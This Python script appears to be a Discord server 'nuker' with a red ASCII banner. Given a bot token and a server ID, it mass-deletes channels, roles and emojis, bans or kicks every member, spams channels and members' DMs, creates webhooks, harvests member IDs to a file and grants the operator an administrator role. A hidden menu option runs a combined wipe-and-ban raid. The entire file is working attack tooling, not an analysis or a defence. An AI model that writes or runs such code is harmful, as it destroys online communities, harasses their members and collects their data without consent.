import aiohttp
import time
import asyncio
import json
import random
import os
from colorama import Fore, Style, init

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_config():
    try:
        with open("config.json", "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

BANNER = (f"""
{Fore.LIGHTRED_EX}
░█████╗░██████╗░██╗████████╗██╗░█████╗░░█████╗░██╗░░░░░  ░░░██╗░██╗░░░███╗░░░░███╗░░░█████╗░
██╔══██╗██╔══██╗██║╚══██╔══╝██║██╔══██╗██╔══██╗██║░░░░░  ██████████╗░████║░░░████║░░██╔══██╗
██║░░╚═╝██████╔╝██║░░░██║░░░██║██║░░╚═╝███████║██║░░░░░  ╚═██╔═██╔═╝██╔██║░░██╔██║░░╚██████║
██║░░██╗██╔══██╗██║░░░██║░░░██║██║░░██╗██╔══██║██║░░░░░  ██████████╗╚═╝██║░░╚═╝██║░░░╚═══██║
╚█████╔╝██║░░██║██║░░░██║░░░██║╚█████╔╝██║░░██║███████╗  ╚██╔═██╔══╝███████╗███████╗░█████╔╝
░╚════╝░╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝  ░╚═╝░╚═╝░░░╚══════╝╚══════╝░╚════╝░
""")

def draw_menu():
    print(f"{Fore.LIGHTRED_EX}╔══════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.LIGHTRED_EX}║ {Fore.WHITE}[01] Del Channels      {Fore.WHITE}[02] Create Channels  {Fore.WHITE}[03] Fast Spam      {Fore.LIGHTRED_EX}║")
    print(f"{Fore.LIGHTRED_EX}║ {Fore.WHITE}[04] Change Srv Name   {Fore.WHITE}[05] Ban All Members  {Fore.WHITE}[06] Kick All       {Fore.LIGHTRED_EX}║")
    print(f"{Fore.LIGHTRED_EX}║ {Fore.WHITE}[07] Give Admin        {Fore.WHITE}[08] Delete Emojis    {Fore.WHITE}[09] Delete Roles   {Fore.LIGHTRED_EX}║")
    print(f"{Fore.LIGHTRED_EX}║ {Fore.WHITE}[10] Create Roles      {Fore.WHITE}[11] Spam Members DM  {Fore.WHITE}[12] Save All IDs   {Fore.LIGHTRED_EX}║")
    print(f"{Fore.LIGHTRED_EX}║ {Fore.WHITE}[13] Create Webhooks   {Fore.WHITE}[14] Exit Program     {Fore.WHITE}[15] Rename Channels{Fore.LIGHTRED_EX}║")
    print(f"{Fore.LIGHTRED_EX}╚══════════════════════════════════════════════════════════════════╝")


async def delete_ch(session, url, headers, c_id, c_name):
    async with session.delete(f"{url}/channels/{c_id}", headers=headers) as r:
        if r.status in [200, 204]: print(f"{Fore.RED}[-]{Fore.WHITE} Deleted Channel: {Fore.YELLOW}{c_name}")

async def create_ch(session, url, headers, g_id, name):
    async with session.post(f"{url}/guilds/{g_id}/channels", headers=headers, json={"name": name}) as r:
        if r.status in [200, 201]: print(f"{Fore.GREEN}[+]{Fore.WHITE} Created Channel: {Fore.YELLOW}{name}")

async def spam_ch(session, url, headers, c_id, c_name, msg):
    async with session.post(f"{url}/channels/{c_id}/messages", headers=headers, json={"content": msg}) as r:
        if r.status in [200, 201]: print(f"{Fore.GREEN}[+]{Fore.WHITE} Sent to {Fore.YELLOW}{c_name}")

async def ban_m(session, url, headers, g_id, m_id, m_name):
    async with session.put(f"{url}/guilds/{g_id}/bans/{m_id}", headers=headers) as r:
        if r.status in [200, 204]: print(f"{Fore.RED}[-]{Fore.WHITE} {Fore.YELLOW}{m_name}")

async def kick_m(session, url, headers, g_id, m_id, m_name):
    async with session.delete(f"{url}/guilds/{g_id}/members/{m_id}", headers=headers) as r:
        if r.status in [200, 204]: print(f"{Fore.RED}[-]{Fore.WHITE} {Fore.YELLOW}{m_name}")

async def del_emoji(session, url, headers, g_id, e_id, e_name):
    async with session.delete(f"{url}/guilds/{g_id}/emojis/{e_id}", headers=headers) as r:
        if r.status in [200, 204]: print(f"{Fore.RED}[-]{Fore.WHITE} Deleted Emoji: {Fore.YELLOW}{e_name}")

async def del_role(session, url, headers, g_id, r_id, r_name):
    async with session.delete(f"{url}/guilds/{g_id}/roles/{r_id}", headers=headers) as r:
        if r.status in [200, 204]: print(f"{Fore.RED}[-]{Fore.WHITE} Deleted Role: {Fore.YELLOW}{r_name}")

async def create_role(session, url, headers, g_id, name):
    async with session.post(f"{url}/guilds/{g_id}/roles", headers=headers, json={"name": name}) as r:
        if r.status in [200, 201]: print(f"{Fore.GREEN}[+]{Fore.WHITE} Created Role: {Fore.YELLOW}{name}")

async def rename_ch(session, url, headers, c_id, old_name, new_name):
    async with session.patch(f"{url}/channels/{c_id}", headers=headers, json={"name": new_name}) as r:
        if r.status == 200: print(f"{Fore.GREEN}[°]{Fore.WHITE} {old_name} to {Fore.GREEN}{new_name}")

async def create_webhook(session, url, headers, c_id, c_name, h_name):
    async with session.post(f"{url}/channels/{c_id}/webhooks", headers=headers, json={"name": h_name}) as r:
        if r.status in [200, 201]: print(f"{Fore.GREEN}[+]{Fore.WHITE} Created in {Fore.YELLOW}{c_name}")

async def run_tool():
    config = load_config()
    clear(); print(BANNER)
    token = input(f"{Fore.LIGHTRED_EX}┌─╼ kyoja-[token]\n└─╼ {Fore.LIGHTGREEN_EX}$ {Fore.WHITE}").strip()
    time.sleep(2.5)
    clear(); print(BANNER)
    guild_id = input(f"{Fore.LIGHTRED_EX}┌─╼ kyoja-[guild.id]\n└─╼ {Fore.LIGHTRED_EX}$ {Fore.WHITE}").strip()
    time.sleep(1.5)

    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    base_url = "https://discord.com/api/v10"

    async with aiohttp.ClientSession() as session:
        while True:
            clear(); print(BANNER); draw_menu()
            choice = input(f"{Fore.LIGHTRED_EX}┌─╼ kyoja-[kill]\n└─╼ {Fore.LIGHTRED_EX}$ {Fore.WHITE}").strip()

            if choice in ["01", "1"]:
                async with session.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers) as r:
                    tasks = [delete_ch(session, base_url, headers, c['id'], c['name']) for c in await r.json()]
                    await asyncio.gather(*tasks)

            elif choice in ["02", "2"]:
                amt = int(input(f"{Fore.RED}Amount: {Fore.WHITE}"))
                tasks = [create_ch(session, base_url, headers, guild_id, random.choice(config["channel_names"])) for _ in range(amt)]
                await asyncio.gather(*tasks)

            elif choice in ["03", "3"]:
                amt = int(input(f"{Fore.RED}Amount: {Fore.WHITE}"))
                async with session.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers) as r:
                    chans = [c for c in await r.json() if c['type'] == 0]
                    tasks = [spam_ch(session, base_url, headers, c['id'], c['name'], random.choice(config["spam_messages"])) for c in chans for _ in range(amt)]
                    await asyncio.gather(*tasks)

            elif choice in ["04", "4"]:
                new_n = input(f"{Fore.RED}Enter Name: {Fore.WHITE}")
                await session.patch(f"{base_url}/guilds/{guild_id}", headers=headers, json={"name": new_n})

            elif choice in ["05", "5"]:
                async with session.get(f"{base_url}/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
                    tasks = [ban_m(session, base_url, headers, guild_id, m['user']['id'], m['user']['username']) for m in await r.json()]
                    await asyncio.gather(*tasks)

            elif choice in ["06", "6"]:
                async with session.get(f"{base_url}/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
                    tasks = [kick_m(session, base_url, headers, guild_id, m['user']['id'], m['user']['username']) for m in await r.json()]
                    await asyncio.gather(*tasks)

            elif choice in ["07", "7"]:
                u_id = input(f"{Fore.CYAN}Your ID: {Fore.WHITE}")
                async with session.post(f"{base_url}/guilds/{guild_id}/roles", headers=headers, json={"name":"Veylib Admin","permissions":"8"}) as r:
                    role = await r.json()
                    await session.put(f"{base_url}/guilds/{guild_id}/members/{u_id}/roles/{role['id']}", headers=headers)
                    print(f"{Fore.GREEN}[+] Done.")

            elif choice in ["08", "8"]:
                async with session.get(f"{base_url}/guilds/{guild_id}/emojis", headers=headers) as r:
                    tasks = [del_emoji(session, base_url, headers, guild_id, e['id'], e['name']) for e in await r.json()]
                    await asyncio.gather(*tasks)

            elif choice in ["09", "9"]:
                async with session.get(f"{base_url}/guilds/{guild_id}/roles", headers=headers) as r:
                    tasks = [del_role(session, base_url, headers, guild_id, rl['id'], rl['name']) for rl in await r.json()]
                    await asyncio.gather(*tasks)

            elif choice in ["10"]:
                amt = int(input(f"{Fore.RED}Amount: {Fore.WHITE}"))
                tasks = [create_role(session, base_url, headers, guild_id, random.choice(config["role_names"])) for _ in range(amt)]
                await asyncio.gather(*tasks)

            elif choice in ["11"]:
                msg = random.choice(config["spam_messages"])
                async with session.get(f"{base_url}/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
                    for m in await r.json():
                        async with session.post(f"{base_url}/users/@me/channels", headers=headers, json={"recipient_id": m['user']['id']}) as dmc:
                            res = await dmc.json()
                            if 'id' in res: await session.post(f"{base_url}/channels/{res['id']}/messages", headers=headers, json={"content": msg})
                            print(f"{Fore.MAGENTA}[DM] {Fore.WHITE}Sent to {m['user']['username']}")

            elif choice in ["12"]:
                async with session.get(f"{base_url}/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
                    with open(f"{guild_id}_ids.txt", "w") as f:
                        for m in await r.json(): f.write(f"{m['user']['id']}\n")
                print(f"{Fore.GREEN}[*] Saved to ids.txt")

            elif choice in ["13"]:
                async with session.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers) as r:
                    tasks = [create_webhook(session, base_url, headers, c['id'], c['name'], config["webhook_name"]) for c in await r.json() if c['type'] == 0]
                    await asyncio.gather(*tasks)

            elif choice in ["15"]:
                async with session.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers) as r:
                    tasks = [rename_ch(session, base_url, headers, c['id'], c['name'], random.choice(config["channel_names"])) for c in await r.json()]
                    await asyncio.gather(*tasks)


            elif choice == "211":
                r_ch = await session.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers)
                r_mb = await session.get(f"{base_url}/guilds/{guild_id}/members?limit=1000", headers=headers)
                channels_data = await r_ch.json()
                members_data = await r_mb.json()
                tasks = []
                tasks.extend([delete_ch(session, base_url, headers, c['id'], c['name']) for c in channels_data])
                tasks.extend([create_ch(session, base_url, headers, guild_id, random.choice(config["channel_names"])) for _ in range(200)])
                tasks.extend([ban_m(session, base_url, headers, guild_id, m['user']['id'], m['user']['username']) for m in members_data])
                if tasks:
                    await asyncio.gather(*tasks)

            elif choice == "14": break

            print(f"\n{Fore.LIGHTRED_EX}─── Task Finished ───")
            await asyncio.sleep(1.9)

if __name__ == "__main__":
    try: asyncio.run(run_tool())
    except: pass
